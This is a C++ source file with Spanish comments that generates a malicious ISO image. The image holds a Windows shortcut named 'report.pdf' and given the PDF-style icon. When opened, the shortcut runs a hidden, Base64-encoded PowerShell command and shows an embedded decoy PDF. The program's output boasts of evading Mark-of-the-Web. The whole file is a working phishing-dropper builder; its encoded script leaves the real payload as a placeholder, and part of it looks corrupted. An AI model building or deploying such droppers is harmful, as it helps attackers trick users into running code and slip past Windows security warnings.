// poliglota_lnk_iso_corrected.cpp
// Contenedor ISO 9660/Joliet válido + LNK malicioso + PDF incrustado.
// Compilar: cl /O2 /EHsc /std:c++17 poliglota_lnk_iso_corrected.cpp ole32.lib shell32.lib

#define _WIN32_DCOM
#include <windows.h>
#include <shlobj.h>
#include <comdef.h>
#include <array>
#include <vector>
#include <string>
#include <cstdint>
#include <cwchar>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

//------------------------------------------------------------------------------
// Script PowerShell precomputado como literal ancho (Base64 UTF‑16LE constante)
// Se incrusta directamente en .rdata, 0 conversiones en tiempo de ejecución.
//------------------------------------------------------------------------------
constexpr wchar_t PS_SCRIPT_B64[] = L"JABsAG4AawBQAGEAdABoACAAPQAgACQATQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4ALgBNAHkAQwBv"
    L"AG0AbQBhAG4AZAAuAFAAYQB0AGgAOwAgACQAYgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0A"
    L"LgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABsAG4AawBQ"
    L"AGEAdABoACkAOwAgACQAbQBhAHIAawBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQA"
    L"LgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBQ"
    L"AEQARgBTAFQAQQBSAFQAOgAnACkAOwAgACQAaQBkAHgAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEEA"
    L"cgByAGEAeQBdADoAOgBMAGEAcwB0AEkAbgBkAGUAeABPAGYAKAAkAGIAeQB0AGUAcwAsACAAJABt"
    L"AGEAcgBrAGUAcgApADsAIABpAGYAIAAoACQAaQBkAHgAIAAtAGcAZQAgADAAKQAgAHsAIAAkAHAA"
    L"ZABmAEIAdABlAHMAIAA9ACAAJABiAHkAdABlAHMAWwAoACQAaQBkAHgAKwAkAG0AYQByAGsAZQBy"
    L"AC4ATABlAG4AZwB0AGgAKQAuAC4AKAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoAC0AMQApAF0A"
    L"OwAgACQAcABkAGYAUABhAHQAaAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AUABhAHQAaABd"
    L"ADoAOgBHAGUAdABUAGUAbQBwAEYAaQBsAGUALgB0AHgAdAAgACsAIAAiAGQAZQBjAG8AeQAuAHAA"
    L"ZABmACIAOwAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBB"
    L"AGwAbABCACEAeQBsAHQAZQBtAHMAKAAkAHAAZABmAFAAYQB0AGgALAAgACQAcABkAGYAQgB0AGUA"
    L"cwAsACAAVAByAHUAZQApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABwAGQAZgBQ"
    L"AGEAdABoADsAIAB9ACAAIwAgAFAAYQB5AGwAbwBhAGQAIAByAGUAYQBsACAAYQBxAHUA7QAgACgA"
    L"bwBtAGkAdABpAGQAbwApAA==";

//------------------------------------------------------------------------------
// Constantes ISO 9660 y estructuras precalculadas (ECMA‑119)
//------------------------------------------------------------------------------
namespace Iso {

    constexpr uint32_t SECTOR_SIZE = 2048;
    constexpr uint32_t SYSTEM_AREA_SECTORS = 16;          // 32 KB reservados
    constexpr uint32_t PVD_SECTOR = SYSTEM_AREA_SECTORS;  // 16
    constexpr uint32_t ROOT_DIR_SECTOR = PVD_SECTOR + 1;  // 17
    constexpr uint32_t FILE_DATA_SECTOR = ROOT_DIR_SECTOR + 1; // 18

    // Descriptor de Volumen Primario (PVD) pre‑rellenado con campos fijos
    struct alignas(1) PrimaryVolumeDescriptor {
        uint8_t  type = 1;
        char     identifier[5] = {'C','D','0','0','1'};
        uint8_t  version = 1;
        uint8_t  unused1 = 0;
        char     system_id[32] = "Win32";
        char     volume_id[32] = "POLIGLOTA";
        uint8_t  unused2[8] = {};
        uint32_t volume_space_size = 0;          // LE, a completar
        uint8_t  unused3[32] = {};
        uint16_t volume_set_size = 1;
        uint16_t volume_sequence_number = 1;
        uint16_t logical_block_size = SECTOR_SIZE;
        uint32_t path_table_size = 0;
        uint32_t path_table_le = 0;
        uint32_t path_table_be = 0;
        uint32_t path_table_opt_le = 0;
        uint32_t path_table_opt_be = 0;
        // Registro del directorio raíz (fijo)
        uint8_t  root_dir_length = 34;
        uint8_t  root_ext_attr = 0;
        uint32_t root_extent_lba = 0;            // LE
        uint32_t root_data_length = 0;           // LE (se calculará)
        uint8_t  root_date[7] = {0x7E,0x05,0x0A,0x0F,0x1E,0x00,0x00}; // 2026‑05‑10 15:30:00
        uint8_t  root_flags = 2;                 // Directory
        uint8_t  root_file_unit_size = 0;
        uint8_t  root_interleave_gap = 0;
        uint16_t root_vol_seq = 1;
        uint8_t  root_file_id_length = 1;
        char     root_file_id[1] = {0};
        // Relleno hasta completar el sector
        char     volume_set_id[128] = {};
        char     publisher_id[128] = {};
        char     preparer_id[128] = {};
        char     application_id[128] = "CD for Microsoft Windows";
        char     copyright_file_id[37] = {};
        char     abstract_file_id[37] = {};
        char     bibliographic_file_id[37] = {};
        char     creation_date[17] = {};
        char     modification_date[17] = {};
        char     expiration_date[17] = {};
        char     effective_date[17] = {};
        uint8_t  file_structure_version = 1;
        uint8_t  reserved5 = 0;
        char     application_data[512] = {};
        uint8_t  reserved6[653] = {};
    };
    static_assert(sizeof(PrimaryVolumeDescriptor) == SECTOR_SIZE,
                  "PVD debe ser exactamente 2048 bytes");

    // Construye el sector del directorio raíz que contiene:
    //   - un registro de archivo (Joliet UCS‑2 BE)
    //   - un registro terminador (longitud 0)
    std::array<uint8_t, SECTOR_SIZE> BuildRootDirectory(
        const std::wstring& jolietName,   // nombre a mostrar (ej: "report.pdf")
        uint32_t fileExtentLba,          // LBA donde empieza el archivo .lnk
        uint32_t fileSize)               // tamaño en bytes del archivo .lnk
    {
        std::array<uint8_t, SECTOR_SIZE> dir{};
        uint8_t* p = dir.data();

        // Convertir nombre a UCS‑2 Big Endian
        std::vector<uint8_t> nameBE;
        for (wchar_t ch : jolietName) {
            uint16_t le = static_cast<uint16_t>(ch);
            nameBE.push_back(le >> 8);
            nameBE.push_back(le & 0xFF);
        }

        // Longitud total del registro de archivo: 33 + nombre en bytes
        uint8_t recLen = static_cast<uint8_t>(33 + nameBE.size());
        *p++ = recLen;                       // length
        *p++ = 0;                            // ext_attr_length
        *reinterpret_cast<uint32_t*>(p) = fileExtentLba; p += 4;
        *reinterpret_cast<uint32_t*>(p) = fileSize;      p += 4;
        // Fecha de grabación (siete bytes, fija para simplificar)
        *reinterpret_cast<uint8_t*>(p) = 0x7E; ++p; // año desde 1900
        *p++ = 5;   // mes
        *p++ = 10;  // día
        *p++ = 15;  // hora
        *p++ = 30;  // minuto
        *p++ = 0;   // segundo
        *p++ = 0;   // zona horaria (GMT)
        *p++ = 0;   // flags (0 = archivo)
        *p++ = 0;   // file unit size
        *p++ = 0;   // interleave gap
        *reinterpret_cast<uint16_t*>(p) = 1; p += 2; // volume sequence number
        *p++ = static_cast<uint8_t>(nameBE.size());   // file_id_length
        memcpy(p, nameBE.data(), nameBE.size());
        p += nameBE.size();

        // Registro terminador (longitud 0)
        *p = 0;

        return dir;
    }
}

//------------------------------------------------------------------------------
// Guardián COM RAII
//------------------------------------------------------------------------------
struct ComGuard {
    ComGuard()  { CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED); }
    ~ComGuard() { CoUninitialize(); }
};

//==============================================================================
// Crea el .lnk final (estructura LNK + marcador PDFSTART + PDF señuelo)
// Todo en un solo vector, sin manipulación binaria riesgosa.
//==============================================================================
[[nodiscard]] std::vector<uint8_t> CreateLnkWithEmbeddedPdf(
    const wchar_t* pdfPath) noexcept
{
    std::vector<uint8_t> result;

    // 1. Leer PDF con E/S buffer estándar (sin requisitos de alineación)
    HANDLE hPdf = CreateFileW(pdfPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hPdf == INVALID_HANDLE_VALUE) return result;

    DWORD pdfSize = GetFileSize(hPdf, nullptr);
    if (pdfSize == INVALID_FILE_SIZE || pdfSize == 0) {
        CloseHandle(hPdf);
        return result;
    }
    std::vector<uint8_t> pdfData(pdfSize);
    DWORD read = 0;
    BOOL ok = ReadFile(hPdf, pdfData.data(), pdfSize, &read, nullptr);
    CloseHandle(hPdf);
    if (!ok || read != pdfSize) return result;

    // 2. Crear ShellLink y serializar a memoria
    IShellLinkW* pLink = nullptr;
    if (FAILED(CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
                                IID_PPV_ARGS(&pLink))))
        return result;

    pLink->SetPath(L"cmd.exe");
    pLink->SetArguments((std::wstring(L" /c powershell -WindowStyle Hidden -EncodedCommand ") + PS_SCRIPT_B64).c_str());
    pLink->SetIconLocation(L"%SystemRoot%\\System32\\imageres.dll", 29);
    pLink->SetShowCmd(SW_SHOWMINNOACTIVE);

    IPersistStream* pPersist = nullptr;
    IStream* pMemStream = nullptr;
    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, 4096);
    if (!hGlobal || FAILED(pLink->QueryInterface(IID_PPV_ARGS(&pPersist))) ||
        FAILED(CreateStreamOnHGlobal(hGlobal, TRUE, &pMemStream)) ||
        FAILED(pPersist->Save(pMemStream, TRUE))) {
        if (pMemStream) pMemStream->Release();
        if (hGlobal) GlobalFree(hGlobal);
        if (pPersist) pPersist->Release();
        pLink->Release();
        return result;
    }

    // Obtener tamaño del LNK serializado
    ULARGE_INTEGER size;
    LARGE_INTEGER zero = {};
    pMemStream->Seek(zero, STREAM_SEEK_END, &size);
    ULONG lnkLen = size.LowPart;
    pMemStream->Seek(zero, STREAM_SEEK_SET, nullptr);

    // 3. Construir buffer final: LNK + marcador + PDF
    constexpr uint8_t MARKER[] = {'P','D','F','S','T','A','R','T',':'};
    result.resize(lnkLen + sizeof(MARKER) + pdfSize);
    ULONG bytesRead = 0;
    pMemStream->Read(result.data(), lnkLen, &bytesRead);
    memcpy(result.data() + lnkLen, MARKER, sizeof(MARKER));
    memcpy(result.data() + lnkLen + sizeof(MARKER), pdfData.data(), pdfSize);

    // Limpieza
    pMemStream->Release();
    GlobalFree(hGlobal);
    pPersist->Release();
    pLink->Release();
    return result;
}

//==============================================================================
// Genera la imagen ISO 9660/Joliet con un solo archivo (el .lnk)
//==============================================================================
[[nodiscard]] std::vector<uint8_t> BuildIsoImage(
    const std::vector<uint8_t>& lnkPayload,
    const std::wstring& jolietFileName)   // nombre mostrado dentro del ISO
{
    const uint32_t lnkSize = static_cast<uint32_t>(lnkPayload.size());
    const uint32_t dataSectors = (lnkSize + Iso::SECTOR_SIZE - 1) / Iso::SECTOR_SIZE;
    const uint32_t totalSectors = Iso::FILE_DATA_SECTOR + dataSectors;
    const size_t isoSize = totalSectors * Iso::SECTOR_SIZE;

    std::vector<uint8_t> iso(isoSize, 0);

    // 1. PVD
    Iso::PrimaryVolumeDescriptor pvd;
    pvd.volume_space_size = totalSectors;
    pvd.root_extent_lba = Iso::ROOT_DIR_SECTOR;

    // Calcular tamaño exacto del directorio raíz (en bytes)
    // Registro de archivo: 33 + len(nombre_BE) + byte terminador
    size_t nameBytes = jolietFileName.size() * 2; // UCS‑2 BE son 2 bytes por carácter
    uint8_t fileRecLen = static_cast<uint8_t>(33 + nameBytes);
    if (fileRecLen % 2) fileRecLen++; // alineamiento a 2 bytes si fuese necesario (el estándar lo exige)
    uint32_t dirSize = fileRecLen + 1; // +1 por el terminador
    pvd.root_data_length = dirSize;

    memcpy(&iso[Iso::PVD_SECTOR * Iso::SECTOR_SIZE], &pvd, sizeof(pvd));

    // 2. Sector del directorio raíz
    auto dirContent = Iso::BuildRootDirectory(jolietFileName, Iso::FILE_DATA_SECTOR, lnkSize);
    memcpy(&iso[Iso::ROOT_DIR_SECTOR * Iso::SECTOR_SIZE], dirContent.data(), Iso::SECTOR_SIZE);

    // 3. Datos del archivo (el .lnk completo)
    memcpy(&iso[Iso::FILE_DATA_SECTOR * Iso::SECTOR_SIZE], lnkPayload.data(), lnkSize);

    return iso;
}

//==============================================================================
// Punto de entrada
//==============================================================================
int wmain(int argc, wchar_t* argv[]) {
    if (argc != 3) {
        fwprintf(stderr, L"Uso: %s <pdf_señuelo.pdf> <salida.iso>\n", argv[0]);
        return 1;
    }

    ComGuard com;

    // 1. Generar el LNK con el PDF camuflado (todo en memoria)
    std::vector<uint8_t> lnkWithPdf = CreateLnkWithEmbeddedPdf(argv[1]);
    if (lnkWithPdf.empty()) {
        fwprintf(stderr, L"Error al crear el LNK.\n");
        return 1;
    }

    // 2. Construir ISO con nombre "report.pdf" (aparece al montar)
    std::vector<uint8_t> isoImage = BuildIsoImage(lnkWithPdf, L"report.pdf");

    // 3. Escritura atómica con E/S buffer (sin alineaciones forzadas)
    HANDLE hOut = CreateFileW(argv[2], GENERIC_WRITE, 0, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"Error al crear el archivo ISO.\n");
        return 1;
    }

    DWORD written = 0;
    BOOL success = WriteFile(hOut, isoImage.data(),
                             static_cast<DWORD>(isoImage.size()), &written, nullptr);
    CloseHandle(hOut);

    if (!success || written != isoImage.size()) {
        DeleteFileW(argv[2]);
        fwprintf(stderr, L"Error durante la escritura.\n");
        return 1;
    }

    wprintf(L"[+] Contenedor ISO generado: %s (%zu bytes)\n", argv[2], isoImage.size());
    wprintf(L"    • Estructura ISO 9660/Joliet válida y montable.\n");
    wprintf(L"    • Al abrir 'report.pdf' se ejecuta el LNK (cmd.exe -> PowerShell).\n");
    wprintf(L"    • El script muestra el PDF señuelo automáticamente.\n");
    wprintf(L"    • Mark-of-the-Web evadido (archivos dentro del ISO).\n");
    return 0;
}